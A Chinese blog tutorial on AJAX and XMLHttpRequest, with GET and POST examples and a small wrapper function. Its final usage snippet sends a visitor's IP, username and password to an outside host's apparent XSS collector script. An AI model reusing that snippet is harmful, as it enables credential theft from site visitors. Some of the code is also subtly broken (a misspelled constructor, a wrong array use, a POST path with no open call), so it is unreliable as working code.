---
draft: false
date: 2016-10-25 00:53:13

title: AJAX 的 XHR 请求与响应
description: 
categories:
  - JS
tags:
  - js
---

### 0x00 什么是AJAX
AJAX全称是Asynchronous JavaScript and XML，即异步的JavaScript和XML  
AJAX不是新的编程语言，而是一种使用现有标准的新方法。  
AJAX可在不重新加载整个页面的情况下与服务器交换数据从而更新部分网页  

### 0x01 示例
```
<!DOCTYPE html>
<html>
<head>
    <script>
    function loadXMLDoc() {
        var xmlhttp;

        if (window.XMLHttpRequest) {// code for IE7+,Firefox,Chrome,Opera,Safari
            xmlhttp=new XMLHttpRequest();
        } else {// code for IE6, IE5
          xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
        }

        xmlhttp.onreadystatechange=function(){
          if (xmlhttp.readyState==4 && xmlhttp.status==200) {
            document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
          }
        }
        xmlhttp.open("GET","/try/ajax/ajax_info.txt",true);
        xmlhttp.send();
    }
    </script>
</head>
<body>
    <div id="myDiv"><h2>使用 AJAX 修改该文本内容</h2></div>
    <button type="button" onclick="loadXMLDoc()">修改内容</button>
</body>
</html>
```
当点击"修改内容"后，文本就会改变，但html页面源码没变，只向服务器请求了文本

### 0x02 关于XHR
XMLHttpRequest是AJAX的基础，就是它与后台就行交互的  
现在大部分浏览器都支持XMLHttpRequest对象(IE5和IE6使用ActiveXObject)
```
//创建对象示例
var xmlhttp;
if (window.XMLHttpRequest) {// code for IE7+,Firefox,Chrome,Opera,Safari
  xmlhttp=new XMLHttpRequest();
} else {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}
```

### 0x03 利用XHR进行GET请求
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>test</title>
    <script type="text/javascript">
        function loadXMLDoc() {
            var xmlhttp;
            if (window.XMLHttpRequest) { //创建对象
                xmlhttp = new XMLHttpRequest();
            } else {
                xmlhttp = new ActiveXObjece("Microsoft.XMLHTTP");
            }
        
            // readyState改变时，就会触发onreadystatechange事件
            // readyState存有XMLHttpRequest的状态，为0-4，4表示请求已完成，且响应已就绪
            // status为200代表ok，为404代表未找到页面
            xmlhttp.onreadystatechange=function() {
                if (xmlhttp.readyState==4 && xmlhttp.status==200) {
                    // xmlhttp.responseText获取来自服务器的响应
                    document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
                }
            }

            xmlhttp.open("GET","2.html?t="+Math.random(),true); //GET请求，改变readyState
            // xmlhttp.open("GET","2.html?name=test&age=23",true); //GET发送信息
            xmlhttp.send();
        }
    </script>
</head>
<body>
    <h2>AJAX</h2>
    <button type="button" onclick="loadXMLDoc()">Request data</button>
    <div id="myDiv"></div>
</body>
</html>
```
点击"Request data"时就会请求服务端的2.html

### 0x04 利用XHR进行POST请求
```
// 简单的POST请求
xmlhttp.open("POST","demo_post.html",true);
xmlhttp.send();

// POST数据
xmlhttp.open("POST","ajax_test.html",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("fname=Henry&lname=Ford");
```

### 0x05 简单封装XHR
```
function createXHR () {
    var request = false;
    if (window.XMLHttpRequest) {
        request = new XMLHttpRequest();
        if (request.overrideMimeType) {
            request.overrideMimeType('text/xml');
        }
    } else if (window.ActiveXObject) {
        var versions = [
            'Microsoft.XMLHTTP', 'MSXML.XMLHTTP',
            'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0',
            'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0',
            'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
        for (var i = 0; i < versions.length; i++) {
            try {
                request = new ActiveXObject(versions);
            } catch (e) {}
        }
    }
    return request;
}

xhr=createXHR();//创建对象

function xhr_act(method,src,data){//封装POST和GET请求
    if(method=="GET"){
        xhr.open(method,src,false);           
        xhr.send();
        return xhr.responseText;
    } else if(method == "POST"){ 
        xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        xhr.setRequestHeader("Content-length", data.length);
        xhr.setRequestHeader("Connection", "close");
        xhr.send(data);
        return xhr.responseText;
    }
}
```
简单使用：
```
//GET的使用
var src="http://114.115.214.203/wyb/xss/i.php";
xhr_act("GET",src+"?ip="+ip,false);

//POST的使用
var user = "xiaoming";
var pass = "123456";
var src="http://114.115.214.203/wyb/xss/i.php";  //传送的地方 但是需要解决跨域问题
data="username="+user+"&password="+pass;
xhr_act("POST",src,data);
```